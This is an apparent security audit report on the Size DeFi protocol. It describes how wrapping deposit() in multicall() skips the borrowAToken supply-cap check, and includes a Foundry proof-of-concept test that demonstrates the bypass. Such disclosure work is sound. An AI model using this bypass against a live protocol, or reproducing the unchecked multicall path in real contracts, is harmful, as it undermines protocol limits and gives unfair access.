# Vulnerability details

## Impact
```

            // borrow aToken cap is not validated in multicall,
```

In a normal USDC deposit, the `deposit()` function calls `validateBorrowATokenCap()` to ensure the borrowAToken supply doesn't exceed the cap.

```
    function validateBorrowATokenCap(State storage state) external view {
        if (state.data.borrowAToken.totalSupply() > state.riskConfig.borrowATokenCap) {
            revert Errors.BORROW_ATOKEN_CAP_EXCEEDED(
                state.riskConfig.borrowATokenCap, state.data.borrowAToken.totalSupply()
            );
        }
    }
```

However, this check is skipped if the `deposit()` is executed within a `multicall()` context. As a result, users can easily bypass this check by wrapping the `deposit()` in a `multicall()` call.

Those who aware of this bypass could have an unfair advantage over those who don't. For instance, when the cap is reached, new users cannot deposit and participate in the Size protocol, but those who know how to bypass the cap check can still deposit USDC and participate.

## Proof of Concept
```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import {Errors} from "@src/libraries/Errors.sol";
import {DepositParams} from "@src/libraries/actions/Deposit.sol";
import {BaseTest} from "@test/BaseTest.sol";

contract PoC is BaseTest {
    function setUp() public override {
        super.setUp();
        _labels();
    }

    function test_it() public {
        uint256 amount = 10e6;
        _mint(address(usdc), alice, 10e6);
        vm.prank(alice);
        usdc.approve(address(size), type(uint256).max);

        // simulate the scenario where the cap is reached
        uint256 borrowATokenCap = size.riskConfig().borrowATokenCap;
        _deposit(bob, usdc, borrowATokenCap);

        // normal user cannot deposit
        vm.startPrank(alice);
        vm.expectRevert(
            abi.encodeWithSelector(
                Errors.BORROW_ATOKEN_CAP_EXCEEDED.selector, borrowATokenCap, borrowATokenCap + amount
            )
        );
        size.deposit(DepositParams(address(usdc), amount, alice));
        vm.stopPrank();

        // however, user can bypass this restriction
        vm.startPrank(alice);
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSelector(
            size.deposit.selector,
            DepositParams(address(usdc), amount, alice)
        );
        size.multicall(data);
        vm.stopPrank();
    }
}
```
This PoC shows that users can bypass the borrowAToken cap check by wrapping a `deposit()` in a `multicall()` trasaction.

## Tools Used
Manual Review, Foundry

## Recommended Mitigation Steps
Consider removing the `validateBorrowATokenCap()` check, as it can be easily bypassed and could create potential unfairness among users.
